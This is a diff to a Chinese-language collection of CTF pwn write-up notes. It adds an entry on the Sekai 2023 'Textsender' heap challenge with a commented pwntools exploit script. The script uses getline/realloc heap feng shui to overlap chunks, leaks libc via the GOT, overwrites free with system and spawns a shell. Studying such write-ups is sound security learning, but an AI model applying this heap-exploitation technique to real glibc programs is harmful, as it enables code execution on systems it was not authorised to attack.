@@ -1276,4 +1276,35 @@ int main() {
   //Output: "                                          a"
   ```
   利用这个format可以实现pie无leak情况下修改返回地址（但是成功率1/3）
-- 一个解释得更明白的补充wp： https://ywhkkx.github.io/2023/09/06/LITCTF2023/#stiller-printf 。但是好像打错字了，“对其”应该是”对齐“
+- 一个解释得更明白的补充wp： https://ywhkkx.github.io/2023/09/06/LITCTF2023/#stiller-printf 。但是好像打错字了，"对其"应该是"对齐"
+121. [Textsender](https://github.com/5kuuk/CTF-writeups/tree/main/sekai-2023/textsender)
+- scanf函数的特点：当使用%s接受用户输入的字符串时，会在末尾填上`\x00`。off by null重灾区。另外，scanf接收到空格就自动截断，因此无法输入空格
+- getline函数（`getline(char **lineptr, size_t *n, FILE *stream)`）内部调用了`_IO_getdelim`。当`*lineptr`为null或`*size`为0时，会自动malloc 120字节给`*lineptr`。若当前大小不够存储用户输入，该buffer会不断realloc为当前size的两倍。如果当前chunk后面是空闲的，realloc会基于当前地址延长当前chunk
+- 作者将wp里使用的方法称为House of Botcake的变种。感觉更重要的是对getline的使用
+```py
+# heap feng shui
+# the goal is overlapping the top chunk with a chunk containing name & content pointers
+empty_tcache() #分配7个均在tcache范围里的chunk
+add_message(b"a",b"b") # -> chunk U (0x200), it will go into unsorted bin once freed
+set_sender(b"boop") # chunk S
+send_all() #free全部chunk，先free刚才的chunk S再到其他的
+empty_tcache(n=6) # 分配6个chunk，only chunk S left in 0x80 tcache bin (will be used+extended by getline)
+fake_edit(b"Sender: "*128) # 这个函数内部使用了getline。因为使用的ptr是null，S就被malloc出来了。正好S后面是top chunk，getline (realloc) will extend S beyond tcache range, it will then be consolidated with U and the top chunk when subsequently freed（这个函数最后free了getline的lineptr，S前面的U是空闲的，两者合并，然后一起并入topchunk）
+add_message(b"empty",b"bins") # empty heap bins。前面从tcache里拿了6个，这里再拿一个就把最开始的7个清空了
+fake_edit(b"a"*(0x2a0-8)+p64(0x20|1)+b"Sender: \x00"*512) # reforge chunk S with size 0x20。这块比较神奇。这里edit的内容由于题目的特殊实现，并没有被写入任何一个之前malloc的chunk，而是进到getline函数，写入了从topchunk切下来的内存。b"a"*(0x2a0-8)是chunk U的大小，p64(0x20|1)+b"Sender: \x00"*512写入了chunk S的size和content（fd）
+send_all() # overlapping chunks since S is freed and is also part of the top chunk。又free了一次chunk S，但是注意此时chunk S还在topchunk里
+empty_tcache(n=6) # only S left in 0x20 tcache bin。之前改了chunk S的sizw，所以现在在0x20的bin里
+add_message(b"victim",b"victim") # uses chunk S to store name and content pointers。0x20是题目中用来存储两个指针的struct的大小，所以这里拿到了chunk S来存储指针
+# libc leak + got overwrite
+# (replace name and content pointers of our victim message by got entries)
+fake_edit(b"a"*(0x2a0-8) + p64(0x20|1) + p64(exe.got.free) * 2) #chunk U+chunk S size+free
+drafts = print_all()
+leak = drafts[7].split(b") ")[1][:6]
+free_addr = unpack(leak,'all')
+libc.address = free_addr - libc.sym.free
+printx(free=free_addr)
+printx(libc=libc.address)
+edit_message(leak+b"\x00",p64(libc.sym.system)) #修改之前写入的free got为system
+fake_edit(b"/bin/sh\x00")
+io.interactive()
+```
